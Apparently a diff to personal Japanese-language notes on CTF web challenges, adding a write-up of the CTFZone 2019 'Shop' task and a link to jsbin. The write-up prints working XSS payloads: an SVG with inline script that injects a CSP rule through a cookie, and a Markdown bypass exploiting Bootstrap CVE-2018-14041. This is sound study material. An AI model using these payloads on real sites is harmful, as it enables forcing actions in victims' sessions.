@@ -1142,10 +1142,116 @@ https://challenge-1220.intigriti.io/?num2=NaN#&num1=alert(document.domain);//?nu
 ```txt
 https://challenge-1220.intigriti.io/#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval
 ```
+## SVG image XSS / XSS chain / bypass Markdown / BootStrap before 4.1.2(CVE-2018-14041) (CTFZone 2019 Quals - Shop Task)
+https://blog.blackfan.ru/2019/12/ctfzone-2019-shop.html  
+- **entrypoint**   
+「Title」「Text」「Select Image」でチケットのタイトルとテキスト本文と画像をアップロードできるWebサイトがある。adminのクローラにURLを送信する形式なので、URLを送信してXSSを発火させられればよい。  
+画像をアップロードした先とチケットを投稿する先ではドメインが異なり、チケットの方はCSPルールがセットされており、XSSができない…  
+SVG画像がアップできるので、アップロード先では以下のようにXSSができる！  
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    alert(1);
+  </script>
+</svg>
+```
+チケットの投稿先では以下のCSPがセットされており、`$$cookie_scope$$`にはCookieのscopeという値がセットされるらしい。   
+```txt
+Content-Security-Policy: 
+    default-src 'self'; 
+    style-src 'self'; 
+    img-src 'self' http://uploads.web-shop.ctfz.one; 
+    report-uri /csp?scope=$$cookie_scope$$;
+```
+Cookieに以下のようにセットするとCSPルール内にInjectできる！  
+```txt
+Cookie: scope=%20//758608540/%20%3B%20script-src%20'unsafe-inline'%20'self'%20'unsafe-eval'%3B;
+```
+```txt
+Content-Security-Policy: 
+    default-src 'self'; 
+    style-src 'self'; 
+    img-src 'self' http://uploads.web-shop.ctfz.one; 
+    report-uri /csp?scope= //758608540/; 
+    script-src 'unsafe-inline' 'self' 'unsafe-eval';
+```
+したがって、画像アップロード先のXSSでチケット投稿先のCSPルールを改竄してチケット投稿先でもXSSできるようにする必要がある  
+テキスト入力内では以下のようにマークダウンを書くと`>`がエスケープされずにHTMLとして出力される。  
+```html
+[xxx<xxx](http://xxx)
+
+<a href="http://xxx">xxx<xxx</a>
+```
+このページではjquery-3.2.1.slim.min.js、popper.min.js、bootstrap.min.jsを使用しており、bootstrapの4.1.2以下のバージョンを使用している場合はXSSが可能である(CVE-2018-14041)！  https://github.com/twbs/bootstrap/issues/26627　　
+以下は`#`以降の文字列をJSとしてevalで実行するXSSPayloadである  
+```html
+[x<x<x data-spy=scroll data-target=<img/src/onerror=eval(location.hash.slice(1))&gt; zz](http://)
+
+<a href="http://">x<x&lt;x data-spy=scroll data-target=&lt;img/src/onerror=eval(location.hash.slice(1))&gt; zz</a>
+```
+したがって、以下のようにまずチケット投稿先ページでXSS(CSPがあるので今は発動しない)を仕込んで置き、そのあとにSVG画像によって画像アップロード先でXSSで、チケット投稿先のCSPを改竄しチケット投稿先のあらかじめ用意したMarkdownのXSSでadminにすべてのボタンをJqueryで押下させる！(flagが入っている投稿がadminにしか見えない形であるはずってことかな…？)  
+```html
+<!DOCTYPE html>
+<html>
+<body>
+    <a href="http://">x<x&lt;x data-spy=scroll data-target=&lt;img/src/onerror=alert(document.domain)&gt; zz</a>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.slim.min.js"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+</html>
+```
+```xml
+<svg ...>
+  <script type="text/javascript">
+    document.cookie="scope=%20//758608540/%20%3B%20script-src%20'unsafe-inline'%20'self'%20'unsafe-eval'%3B;domain=.web-shop.ctfz.one;path=/;";
+    location="http://web-shop.ctfz.one/ticket/541c92e3-d1c5-47f0-9668-9d4c3f6c7dc1#jQuery('#inputText').val('pwn');jQuery('.btn').click();";
+  </script>
+</svg>
+```
+- **Payload**   
+SVG画像によるXSS  
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    document.cookie="scope=%20//758608540/%20%3B%20script-src%20'unsafe-inline'%20'self'%20'unsafe-eval'%3B;domain=.web-shop.ctfz.one;path=/;";
+    location="http://web-shop.ctfz.one/ticket/541c92e3-d1c5-47f0-9668-9d4c3f6c7dc1#jQuery('#inputText').val('pwn');jQuery('.btn').click();";
+  </script>
+</svg>
+```
+MarkdownによるBootstrap4.1.2以下のXSS  
+```html
+<!DOCTYPE html>
+<html>
+<body>
+    <a href="http://">x<x&lt;x data-spy=scroll data-target=&lt;img/src/onerror=alert(document.domain)&gt; zz</a>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.slim.min.js"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+</html>
+```
+adminのクローラに以下のURLを提出する。  
+```txt
+[svg](http://uploads.web-shop.ctfz.one/10f02271-2aaf-47e7-82c8-60941bb11fa0/093c690b-ba19-4705-b299-38c8286fc8d6.svg)
+```
 ## 
 - **entrypoint**   
 - **概要**   
 - **Payload**   
+
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
 
 ## CSS Injection / Self Injection / Header Injection / Command Injection (Google CTF Cat Chat)
 https://terjanq.github.io/google-ctf-writeups/   
@@ -1540,7 +1646,8 @@ http://www.thespanner.co.uk/2012/05/08/eval-a-url/
 `eval(url)`としてurlの形態を保ったままでJSを実行できるらしい  
 https://renaudmarti.net/posts/intigriti-xss-challenge/  
 動作環境ないと理解するの難しそう…  
-
+https://jsbin.com/?html  
+html,css,JavaScript,Consoleを自由に実行できるようなサイト。XSSの検証によさそう！  
 
 
 
